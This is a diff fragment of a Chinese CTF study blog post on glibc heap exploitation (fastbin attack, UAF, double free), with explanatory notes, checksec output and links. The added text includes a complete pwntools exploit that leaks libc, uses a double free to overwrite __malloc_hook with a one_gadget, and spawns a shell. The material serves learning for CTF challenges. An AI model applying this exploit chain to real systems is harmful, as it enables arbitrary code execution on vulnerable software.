+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/45F28C56-0831-4C6D-8ECD-5AECE309302B.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/45F28C56-0831-4C6D-8ECD-5AECE309302B.png" srcset="data:image/png;base64,666" alt="45F28C56-0831-4C6D-8ECD-5AECE309302B" style="zoom:50%;">
+
+
+
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/6C175D1A-C0AF-4A38-8151-E10BF1BA1A4B.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/6C175D1A-C0AF-4A38-8151-E10BF1BA1A4B.png" srcset="data:image/png;base64,666" alt="6C175D1A-C0AF-4A38-8151-E10BF1BA1A4B" style="zoom:33%;">
+
+
+
+<p>如果此时再申请两次，把fastbins里的3070和3000申请走，就会只剩下‘bbbb’</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/6E59A2D1-C1B4-4DC5-9DD2-86D6FB4C328B.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/6E59A2D1-C1B4-4DC5-9DD2-86D6FB4C328B.png" srcset="data:image/png;base64,666" alt="6E59A2D1-C1B4-4DC5-9DD2-86D6FB4C328B" style="zoom:33%;">
+
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/793EFD56-1A5D-468A-BF13-B24380253FE5.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/793EFD56-1A5D-468A-BF13-B24380253FE5.png" srcset="data:image/png;base64,666" alt="793EFD56-1A5D-468A-BF13-B24380253FE5" style="zoom:80%;">
+
+
+
+<p>此时2号块和4号块其实是同一个块，修改其中一个，另一个也会改变。</p>
+<p><strong>危害原理：</strong>通过修改free状态的堆块的fd指针，造成指针的指向改变(指向任意想要指向的地方)，达到攻击目的，俗称<strong>fastbin attack</strong></p>
+<p>使用前提是必须有<strong>uaf</strong>。</p>
+<p>还有一个使用的隐形前提是：fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空，所以会被认为是使用状态，所以下次free的时候，还是可以free的。</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/1A2088A3-13A1-403E-89F0-9D6B6C99AED7.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/1A2088A3-13A1-403E-89F0-9D6B6C99AED7.png" srcset="data:image/png;base64,666" alt="1A2088A3-13A1-403E-89F0-9D6B6C99AED7" style="zoom:50%;">
+
+<p>这里71中的1表示 前一个堆块被使用。</p>
+<p>已知double free可以修改指针，那么如果能泄漏地址，可以造成和uaf同样的效果。不同的地方是：uaf需要多add几次，才能申请到我们想要的堆块。</p>
+<p>【经提示，uaf是漏洞类型，uaf是漏洞的利用方式 】</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;libc_base ---&gt;&quot;</span> + hex(libc_base) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;system ---&gt;&quot;</span> + hex(system) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;binsh ---&gt;&quot;</span> + hex(binsh) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------one_gadget:0x45226 0x4527a 0xf0364 0xf1207------------</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;one_gadget ---&gt;&quot;</span> + hex(one_gadget) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;malloc_hook ---&gt;&quot;</span> + hex(malloc_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;realloc ---&gt;&quot;</span> + hex(realloc)</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;fake_chunk ---&gt; &quot;</span> + hex(fake_chunk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,p64(fake_chunk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#py += &#x27;a&#x27;*0x23 + p64(one_gadget) + &#x27;\n&#x27;</span></span><br><span class="line">py+= <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc+<span class="number">2</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">print</span> py + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h3 id="offbyone-and-offbynull"><a href="#offbyone-and-offbynull" class="headerlink" title="offbyone and offbynull"></a>offbyone and offbynull</h3><h3 id="tcache技术"><a href="#tcache技术" class="headerlink" title="tcache技术"></a>tcache技术</h3><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><p>地址 <a target="_blank" rel="noopener" href="https://github.com/Dittozzz/CISCN_2019_final_day1_pwn_6">https://github.com/Dittozzz/CISCN_2019_final_day1_pwn_6</a></p>
 <p>1、可以实现的功能：(1)free (2)malloc</p>
 <p>2、checksec </p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO 重定向，无法修改GOT表</span><br><span class="line">Stack:    Canary found 金丝雀</span><br><span class="line">NX:       NX enabled 栈不可执行</span><br><span class="line">PIE:      PIE enabled 内存地址随机化</span><br></pre></td></tr></table></figure>
@@ -588,6 +965,10 @@
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/elvirangel/p/8893916.html">https://www.cnblogs.com/elvirangel/p/8893916.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jazrynwong/article/details/88240182">https://blog.csdn.net/jazrynwong/article/details/88240182</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/465466516/">https://www.freesion.com/article/465466516/</a></p>
+<p>1_chunk</p>
+<p>链接:<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1UiqhbRn1GIVECJpSqKgbcQ">https://pan.baidu.com/s/1UiqhbRn1GIVECJpSqKgbcQ</a>  密码:k9rp</p>
+<p>libc 地址</p>
+<p><a target="_blank" rel="noopener" href="http://ftp.gnu.org/gnu/glibc/">http://ftp.gnu.org/gnu/glibc/</a></p>
 
   
   
@@ -622,10 +1003,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-17T20:55:13+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-29T14:28:00+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Dec 17, 2020</p>
+    <p>更新于：Dec 29, 2020</p>
   </a>
 </div>
 
@@ -750,7 +1131,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF"><span class="toc-text">UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%83%E4%B9%A01%E2%80%94chunk"><span class="toc-text">练习1—chunk</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#double-free"><span class="toc-text">double free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink"><span class="toc-text">unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#offbyone-and-offbynull"><span class="toc-text">offbyone and offbynull</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache%E6%8A%80%E6%9C%AF"><span class="toc-text">tcache技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A01"><span class="toc-text">练习1</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF"><span class="toc-text">UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%83%E4%B9%A01%E2%80%94chunk"><span class="toc-text">练习1—chunk</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#double-free"><span class="toc-text">double free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#double-free-1"><span class="toc-text">double free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink"><span class="toc-text">unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#offbyone-and-offbynull"><span class="toc-text">offbyone and offbynull</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache%E6%8A%80%E6%9C%AF"><span class="toc-text">tcache技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A01"><span class="toc-text">练习1</span></a></li></ol>
     </div>
   </section>
 
